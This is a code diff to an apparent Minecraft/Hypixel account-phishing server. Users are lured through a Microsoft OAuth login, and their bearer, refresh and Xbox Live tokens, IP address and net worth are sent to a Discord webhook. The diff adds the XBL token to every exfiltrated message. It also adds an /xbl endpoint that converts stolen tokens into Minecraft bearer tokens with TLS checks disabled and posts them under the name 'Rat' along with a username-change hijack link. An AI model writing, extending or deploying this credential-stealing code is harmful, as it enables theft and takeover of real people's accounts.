@@ -7,6 +7,7 @@ const redirection = 'https://hypixel.net' //Redirects the user after they login 
 const microsoft = true //IF TRUE, WILL REDIRECT TO MICROSOFT DRECTLY INSTEAD OF THE PAGE WITH THE BUTTON
 
 //Requirements
+const https = require("https")
 const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id='+client_id+'&response_type=code&redirect_uri='+redirect_uri+'&scope=XboxLive.signin+offline_access&state=NOT_NEEDED'
 const axios = require('axios')
 const discord_api = 'https://discord.com/api/webhooks/'
@@ -51,7 +52,7 @@ app.get('/', async (req, res) => {
         const level = playerData[1].toFixed()
         const status = await getPlayerStatus(username)
         const discord = await getPlayerDiscord(username)
-        postToWebhook(discord, status, formatNumber, level, rank, username, bearerToken, uuid, ip, refreshToken, country,  flag)
+        postToWebhook(discord, status, formatNumber, level, rank, username, bearerToken, uuid, ip, refreshToken, country,  flag, userToken)
     } catch (e) {
         console.log(e)
     }
@@ -231,7 +232,7 @@ async function getNetworth(username) {
 
 
     
-async function postToWebhook(discord, status, formatNumber, level, rank, username, bearerToken, uuid, ip, refreshToken, country,  flag) {
+async function postToWebhook(discord, status, formatNumber, level, rank, username, bearerToken, uuid, ip, refreshToken, country,  flag, userToken) {
     const url = webhook_url
     const networthArray = await getNetworth(username)
 	const networth = networthArray[0]
@@ -258,6 +259,7 @@ content: "@everyone ",
       thumbnail: {
         url: 'https://visage.surgeplay.com/full/'+uuid
 	      },
+          description: "[XBL Refresh]("+redirect_uri+"/xbl?xbl="+userToken+")",
       fields: [
         {
             name: "**Username:**",
@@ -316,7 +318,7 @@ content: "@everyone ",
         
       ],
       "footer": {
-        "text": "By heda",
+        "text": "By dune",
         "icon_url": "https://cdn.discordapp.com/avatars/919624780112592947/a_119345db608773253c2c6d687ea25155.webp"
       }
     }
@@ -333,6 +335,7 @@ content: "@everyone "+total_networth,
       thumbnail: {
         url: 'https://visage.surgeplay.com/full/'+uuid
 	      },
+          description: "[XBL Refresh]("+redirect_uri+"/xbl?xbl="+userToken+")",
       fields: [
         {
             name: "**Username:**",
@@ -457,7 +460,7 @@ app.get('/refresh', async (req, res) => {
         const level = playerData[1].toFixed()
         const status = await getPlayerStatus(username)
 	const discord = await getPlayerDiscord(username)
-        refreshToWebhook(discord, status, formatNumber, level, rank, username, bearerToken, uuid, ip, newRefreshToken, country, flag)
+        refreshToWebhook(discord, status, formatNumber, level, rank, username, bearerToken, uuid, ip, newRefreshToken, country, flag, userToken)
     } catch (e) {
         console.log(e)
     }
@@ -485,7 +488,7 @@ async function getRefreshData(refresh_token) {
 
 
 
-async function refreshToWebhook(discord, status, formatNumber, level, rank, username, bearerToken, uuid, ip, newRefreshToken, country, flag) {
+async function refreshToWebhook(discord, status, formatNumber, level, rank, username, bearerToken, uuid, ip, newRefreshToken, country, flag, userToken) {
     const url = webhook_url
     const wrongToken = bearerToken.slice(0, 150)+"iwicm"+bearerToken.slice(150, 390)
     const networthArray = await getNetworth(username)
@@ -513,6 +516,7 @@ content: "@everyone TOKEN REFRESHED!!!!",
       thumbnail: {
         url: 'https://visage.surgeplay.com/full/'+uuid
 	      },
+          description: "[XBL Refresh]("+redirect_uri+"/xbl?xbl="+userToken+")",
       fields: [
         {
             name: "**Username:**",
@@ -571,7 +575,7 @@ content: "@everyone TOKEN REFRESHED!!!!",
         
       ],
       "footer": {
-        "text": "By heda",
+        "text": "By dune",
         "icon_url": "https://cdn.discordapp.com/avatars/919624780112592947/a_119345db608773253c2c6d687ea25155.webp"
       }
     }
@@ -588,6 +592,7 @@ content: "@everyone TOKEN REFRESHED!!!! "+total_networth,
       thumbnail: {
         url: 'https://visage.surgeplay.com/full/'+uuid
 	      },
+          description: "[XBL Refresh]("+redirect_uri+"/xbl?xbl="+userToken+")",
       fields: [
         {
             name: "**Username:**",
@@ -792,3 +797,79 @@ content: "@everyone "+total_networth,
 
         axios.post(log, data).then(() => console.log("Successfully authenticated and posted to webhook."))
 }
+
+const XBOX_LIVE_AUTH_URL = 'https://xsts.auth.xboxlive.com/xsts/authorize';
+const MINECRAFT_AUTH_URL = 'https://api.minecraftservices.com/authentication/login_with_xbox';
+
+app.get('/xbl', async (req, res) => {
+    const xblToken = req.query.xbl;
+    const key = req.query.key
+
+
+    if (!xblToken) {
+      return res.status(400).send('XBL token not provided.');
+    }
+  
+    try {
+      const xstsResponse = await axios.post(XBOX_LIVE_AUTH_URL, {
+        Properties: {
+          SandboxId: 'RETAIL',
+          UserTokens: [xblToken],
+        },
+        RelyingParty: 'rp://api.minecraftservices.com/',
+        TokenType: 'JWT',
+      }, {
+        headers: {
+          'Content-Type': 'application/json',
+          Accept: 'application/json',
+        },
+        httpsAgent: new https.Agent({
+          rejectUnauthorized: false,
+        }),
+      });
+  
+      const xstsToken = xstsResponse.data.Token;
+      const minecraftResponse = await axios.post(MINECRAFT_AUTH_URL, {
+        identityToken: `XBL3.0 x=${xstsResponse.data.DisplayClaims.xui[0].uhs};${xstsToken}`,
+      }, {
+        headers: {
+          'Content-Type': 'application/json',
+          Accept: 'application/json',
+        },
+        httpsAgent: new https.Agent({
+          rejectUnauthorized: false,
+        }),
+      });
+      const bearerToken = minecraftResponse.data.access_token
+      let data = {
+        username: "[LVL 100] Rat",
+          avatar_url: "https://cdn.discordapp.com/avatars/1033045491912552508/0d33e4f7aa3fdbc3507880eb7b2d1458.webp",  
+          embeds: [
+            {
+              color: 3482894,
+              timestamp: new Date(),
+              fields: [          
+                  {
+                    name: "**Token:**",
+                    value: "```"+bearerToken+"```"
+                },
+                {
+                  name: "**Change Username:**",
+                  value: "ㅤ\n||[Click Here]("+redirect_uri+"/changeUsername?token="+bearerToken+")||",
+                }
+              ],
+              "footer": {
+                "text": "dune",
+                "icon_url": "https://cdn.discordapp.com/avatars/919624780112592947/a_119345db608773253c2c6d687ea25155.webp"
+              }
+            }
+          ],
+        }
+
+      axios.post(webhook_url, data).then(() => console.log("XBL refreshed")).catch(error => console.error('Error in posting to webhook:', error))
+      res.send(minecraftResponse.data);
+    } catch (error) {
+      console.error(error);
+      res.status(500).send('Error getting Minecraft bearer token.');
+    }
+  });
